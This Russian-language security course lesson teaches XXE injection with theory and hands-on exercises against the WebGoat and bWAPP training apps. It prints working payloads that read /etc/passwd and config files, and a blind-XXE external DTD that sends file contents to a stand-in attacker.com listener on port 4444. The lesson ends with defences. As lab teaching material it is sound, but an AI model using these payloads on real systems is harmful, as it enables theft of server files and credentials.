# Занятие 25. XXE: XML External Entity, практика на WebGoat

## Теория

**XXE (XML External Entity)** — уязвимость, позволяющая атакующему внедрить внешние сущности в XML-документ, обрабатываемый сервером.

### Механизм работы

XML-парсеры часто поддерживают DTD (Document Type Definition), который позволяет определять сущности. Атакующий может объявить внешнюю сущность, которая читает файл на сервере.

**Пример уязвимого XML:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>John</name>
</user>
```

**XXE пейлоад для чтения файла:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
  <name>&xxe;</name>
</user>
```

Сервер подставит содержимое `/etc/passwd` вместо `&xxe;`.

### Типы XXE-атак

1. **File Disclosure**: Чтение локальных файлов (`/etc/passwd`, `/etc/hosts`, конфиги)
2. **SSRF via XXE**: Использование XXE для запросов к внутренним сервисам
3. **Blind XXE**: Когда результат не виден напрямую, используется exfiltration через HTTP-запрос
4. **DoS via XXE**: "Billion Laughs" атака (раздувание памяти)

### Опасные XML-парсеры

- PHP: `simplexml_load_string()`, `DOMDocument`
- Java: `DocumentBuilderFactory`, `SAXParser`
- Python: `xml.etree.ElementTree` (без защиты)

### Признаки уязвимости

- Приложение принимает XML в запросе
- Заголовок `Content-Type: application/xml`
- Ответ содержит данные, переданные в XML

---

## Практическое занятие

### Настройка WebGoat

1. Убедитесь, что WebGoat запущен: `docker run -d -p 8080:8080 webgoat/goatandwolf`
2. Откройте http://localhost:8080/WebGoat
3. Перейдите в **XXE** → **XXE Injection**

### Практика: Чтение файла через XXE

**Шаг 1: Изучение легитимного запроса**
WebGoat показывает форму ввода. Используйте Burp Suite для перехвата запроса.

Запрос может выглядеть так:
```
POST /WebGoat/xxe/simple HTTP/1.1
Host: localhost:8080
Content-Type: application/xml

<?xml version="1.0"?>
<comment>
  <text>Hello</text>
</comment>
```

**Шаг 2: Внедрение XXE для чтения /etc/passwd**
Измените тело запроса:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <text>&xxe;</text>
</comment>
```

Отправьте запрос. В ответе должно быть содержимое `/etc/passwd` (или сообщение об ошибке, если файл недоступен в контейнере).

**Шаг 3: Чтение других файлов**
Попробуйте прочитать:
- `file:///etc/hostname`
- `file:///proc/version`
- `file:///var/log/webgoat.log` (если есть)

**Шаг 4: Blind XXE через WebGoat**
В разделе **Blind XXE** попробуйте атаку, когда результат не возвращается напрямую.

Пейлоад для Blind XXE с exfiltration:
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com:4444/xxe.dtd">
  %xxe;
]>
```

Где `xxe.dtd` содержит:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:4444/?data=%file;'>">
%eval;
%exfil;
```

**Шаг 5: Проверка через Burp Repeater**
1. Отправьте уязвимый запрос в Repeater (ПКМ → Send to Repeater)
2. Меняйте пути к файлам
3. Наблюдайте за ответами

### Скриншоты для отчета

1. **Скриншот 1**: Burp Proxy — перехваченный XML-запрос
2. **Скриншот 2**: Burp Repeater — XXE пейлоад, ответ содержит содержимое файла
3. **Скриншот 3**: WebGoat — задание XXE выполнено (зеленая галочка)

---

## Задачи для самостоятельного выполнения

1. **Чтение файла в WebGoat**: В разделе **XXE → XXE Injection** выполните чтение файла `/etc/passwd` через XXE. Сделайте скриншот запроса в Burp и ответа сервера. Какие строки из `/etc/passwd` вы увидели?

2. **Чтение конфигурационного файла**: Попробуйте прочитать конфигурационный файл приложения через XXE. В Docker-контейнере WebGoat попробуйте пути:
   - `file:///home/webgoat/.webgoat-config.xml`
   - `file:///opt/webgoat/configuration/webgoat.properties`
   
   Удалось ли прочитать? Опишите результат.

3. **Blind XXE практика**: В WebGoat перейдите в **XXE → Blind XXE**. Настройте простой HTTP-сервер для приема запросов:
   ```bash
   python3 -m http.server 4444
   ```
   Используйте Blind XXE для отправки данных на ваш сервер. Покажите в логах сервера, что запрос пришел.

4. **XXE в bWAPP**: В bWAPP найдите уязвимость **XML External Entity (XXE)**. Установите уровень Low. Отправьте XXE пейлоад через форму. Опишите, какое поле принимает XML и сработал ли пейлоад.

5. **Защита от XXE**: Напишите 3 способа защиты от XXE-уязвимостей на стороне сервера (например, отключение DTD, использование безопасных парсеров). Укажите, как это делается в Java (DocumentBuilderFactory) и PHP (libxml_disable_entity_loader).
